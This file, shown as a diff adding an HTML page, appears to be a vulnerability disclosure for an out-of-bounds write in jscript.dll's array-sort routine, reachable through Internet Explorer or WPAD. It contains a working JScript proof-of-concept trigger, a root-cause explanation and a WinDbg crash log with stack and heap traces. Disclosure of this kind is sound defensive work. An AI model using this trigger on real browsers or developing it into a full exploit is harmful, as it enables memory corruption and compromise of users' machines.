@@ -1,0 +1,149 @@
+<!--
+There is an out-of-bounds write vulnerability in jscript.dll in JsArrayFunctionHeapSort function. This vulnerability can be exploited through Internet Explorer or potentially through WPAD over local network. 
+
+PoC:
+=========================================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+<script language="Jscript.Encode">
+
+function f0() { }
+
+function f1() {
+  f2.prototype = arguments;
+  new f2();
+}
+
+function f2() {
+  Array.prototype.sort.call(this, f0);
+}
+
+f1(1, 2, 3);
+
+</script>
+
+<!--
+=========================================================
+
+Details:
+
+JsArrayFunctionHeapSort is called when sorting an array with a provided comparison function. One of its arguments is the number of elements in the input array/object. The function then allocates a temporary array of the this size, copies all properties of the input array/object into it (where property name is numeric and smaller than the "length" property of the input object) and proceeds to sort the temporary array. Normally, the allocated array is sufficient to store all the properties to be sorted. However, in the case of the attached PoC, where the sorted object prototype is the arguments object, when calculating the number of elements, the number of elements in the arguments object aren't taken into account, which leads to an overflow.
+
+
+Debug Log:
+=========================================================
+
+(1d50.1d80): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=c0c00003 ebx=07512fc0 ecx=0d1e3008 edx=074faf50 esi=0c3c6f30 edi=07512fc0
+eip=6d53a09e esp=096daa44 ebp=096daa6c iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+jscript!NameTbl::GetValCore+0x54915:
+6d53a09e 8901            mov     dword ptr [ecx],eax  ds:002b:0d1e3008=????????
+
+0:007> k
+ # ChildEBP RetAddr  
+00 096daa6c 6d4e5775 jscript!NameTbl::GetValCore+0x54915
+01 096daa8c 6d4e66b1 jscript!NameTbl::GetValById+0x5f
+02 096daad4 6d551f30 jscript!NameTbl::GetVal+0x112
+03 096dab34 6d51d6ae jscript!NameTbl::GetVal+0x50
+04 096dac14 6d51d595 jscript!JsArrayFunctionHeapSort+0xe2
+05 096dac8c 6d4e7850 jscript!JsArraySort+0x1ed
+06 096dacf4 6d4e7730 jscript!NatFncObj::Call+0xe8
+07 096dad84 6d53ab8f jscript!NameTbl::InvokeInternal+0x2cb
+08 096dadbc 6d5432dd jscript!VAR::InvokeByDispID+0x56357
+09 096dae0c 6d4e7850 jscript!JsFncCall+0xbd
+0a 096dae74 6d4e7730 jscript!NatFncObj::Call+0xe8
+0b 096daf04 6d4e657c jscript!NameTbl::InvokeInternal+0x2cb
+0c 096daff8 6d4e74c1 jscript!VAR::InvokeByName+0x1b9
+0d 096db044 6d53ab21 jscript!VAR::InvokeDispName+0x3e
+0e 096db074 6d4e4813 jscript!VAR::InvokeByDispID+0x562e9
+0f 096db45c 6d4e3f7f jscript!CScriptRuntime::Run+0x129e
+10 096db558 6d4e3e03 jscript!ScrFncObj::CallWithFrameOnStack+0x15f
+11 096db5b0 6d5003bb jscript!ScrFncObj::Call+0x7b
+12 096db63c 6d4eec30 jscript!ScrFncObj::Construct+0xeb
+13 096db6c4 6d53ab8f jscript!NameTbl::InvokeInternal+0x338
+14 096db6f8 6d4eeca4 jscript!VAR::InvokeByDispID+0x56357
+15 096dbae0 6d4e3f7f jscript!CScriptRuntime::Run+0x1ff8
+16 096dbbdc 6d4e3e03 jscript!ScrFncObj::CallWithFrameOnStack+0x15f
+17 096dbc34 6d4e3d03 jscript!ScrFncObj::Call+0x7b
+18 096dbcc4 6d53ab8f jscript!NameTbl::InvokeInternal+0x2cb
+19 096dbcf8 6d4e4813 jscript!VAR::InvokeByDispID+0x56357
+1a 096dc0e0 6d4e3f7f jscript!CScriptRuntime::Run+0x129e
+1b 096dc1dc 6d4e3e03 jscript!ScrFncObj::CallWithFrameOnStack+0x15f
+1c 096dc234 6d4e4ae7 jscript!ScrFncObj::Call+0x7b
+1d 096dc2d8 6d4f32eb jscript!CSession::Execute+0x23d
+1e 096dc320 6d4f4d63 jscript!COleScript::ExecutePendingScripts+0x16b
+1f 096dc39c 6d4f4b49 jscript!COleScript::ParseScriptTextCore+0x206
+20 096dc3c8 6e5c7d14 jscript!COleScript::ParseScriptText+0x29
+21 096dc400 6e5c81eb MSHTML!CActiveScriptHolder::ParseScriptText+0x51
+22 096dc470 6e27d1d1 MSHTML!CScriptCollection::ParseScriptText+0x1c6
+23 096dc55c 6e27cd73 MSHTML!CScriptData::CommitCode+0x31e
+24 096dc5dc 6e27d90d MSHTML!CScriptData::Execute+0x232
+25 096dc5fc 6e5a4bb6 MSHTML!CHtmScriptParseCtx::Execute+0xed
+26 096dc650 6e582f12 MSHTML!CHtmParseBase::Execute+0x201
+27 096dc66c 6df9bd5f MSHTML!CHtmPost::Broadcast+0x18e
+28 096dc7a4 6e063799 MSHTML!CHtmPost::Exec+0x617
+29 096dc7c4 6e0636ff MSHTML!CHtmPost::Run+0x3d
+2a 096dc7e0 6e06aef7 MSHTML!PostManExecute+0x61
+2b 096dc7f4 6e06bce8 MSHTML!PostManResume+0x7b
+2c 096dc824 6e0524b8 MSHTML!CHtmPost::OnDwnChanCallback+0x38
+2d 096dc83c 6df4d4f3 MSHTML!CDwnChan::OnMethodCall+0x2f
+2e 096dc88c 6df4d072 MSHTML!GlobalWndOnMethodCall+0x1a1
+2f 096dc8e0 758962fa MSHTML!GlobalWndProc+0x103
+30 096dc90c 75896d3a user32!InternalCallWinProc+0x23
+31 096dc984 758977c4 user32!UserCallWinProcCheckWow+0x109
+32 096dc9e4 7589788a user32!DispatchMessageWorker+0x3b5
+33 096dc9f4 6f34ab7c user32!DispatchMessageW+0xf
+34 096dfbc0 6f3b75f8 IEFRAME!CTabWindow::_TabWindowThreadProc+0x464
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\syswow64\iertutil.dll - 
+35 096dfc80 75b46b7c IEFRAME!LCIETab_ThreadProc+0x3e7
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Internet Explorer\IEShims.dll - 
+WARNING: Stack unwind information not available. Following frames may be wrong.
+36 096dfc98 72153a31 iertutil!PrivateCoInternetCombineIUri+0x2bbc
+37 096dfcd0 7554343d IEShims!IEShims_SetRedirectRegistryForThread+0x1c1
+38 096dfcdc 77d99802 kernel32!BaseThreadInitThunk+0xe
+39 096dfd1c 77d997d5 ntdll!__RtlUserThreadStart+0x70
+3a 096dfd34 00000000 ntdll!_RtlUserThreadStart+0x1b
+ 
+0:007> !heap -p -a 0d1e3008
+    address 0d1e3008 found in
+    _DPH_HEAP_ROOT @ 7d1000
+    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
+                                 a893bc8:          d1e2fe8               18 -          d1e2000             2000
+    723f8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
+    77e30fe6 ntdll!RtlDebugAllocateHeap+0x00000030
+    77deab8e ntdll!RtlpAllocateHeap+0x000000c4
+    77d93461 ntdll!RtlAllocateHeap+0x0000023a
+    75ff9d45 msvcrt!malloc+0x0000008d
+    6d51d645 jscript!JsArrayFunctionHeapSort+0x00000079
+    6d51d595 jscript!JsArraySort+0x000001ed
+    6d4e7850 jscript!NatFncObj::Call+0x000000e8
+    6d4e7730 jscript!NameTbl::InvokeInternal+0x000002cb
+    6d53ab8f jscript!VAR::InvokeByDispID+0x00056357
+    6d5432dd jscript!JsFncCall+0x000000bd
+    6d4e7850 jscript!NatFncObj::Call+0x000000e8
+    6d4e7730 jscript!NameTbl::InvokeInternal+0x000002cb
+    6d4e657c jscript!VAR::InvokeByName+0x000001b9
+    6d4e74c1 jscript!VAR::InvokeDispName+0x0000003e
+    6d53ab21 jscript!VAR::InvokeByDispID+0x000562e9
+    6d4e4813 jscript!CScriptRuntime::Run+0x0000129e
+    6d4e3f7f jscript!ScrFncObj::CallWithFrameOnStack+0x0000015f
+    6d4e3e03 jscript!ScrFncObj::Call+0x0000007b
+    6d5003bb jscript!ScrFncObj::Construct+0x000000eb
+    6d4eec30 jscript!NameTbl::InvokeInternal+0x00000338
+    6d53ab8f jscript!VAR::InvokeByDispID+0x00056357
+    6d4eeca4 jscript!CScriptRuntime::Run+0x00001ff8
+    6d4e3f7f jscript!ScrFncObj::CallWithFrameOnStack+0x0000015f
+    6d4e3e03 jscript!ScrFncObj::Call+0x0000007b
+    6d4e3d03 jscript!NameTbl::InvokeInternal+0x000002cb
+    6d53ab8f jscript!VAR::InvokeByDispID+0x00056357
+    6d4e4813 jscript!CScriptRuntime::Run+0x0000129e
+    6d4e3f7f jscript!ScrFncObj::CallWithFrameOnStack+0x0000015f
+    6d4e3e03 jscript!ScrFncObj::Call+0x0000007b
+    6d4e4ae7 jscript!CSession::Execute+0x0000023d
+    6d4f32eb jscript!COleScript::ExecutePendingScripts+0x0000016b
+-->
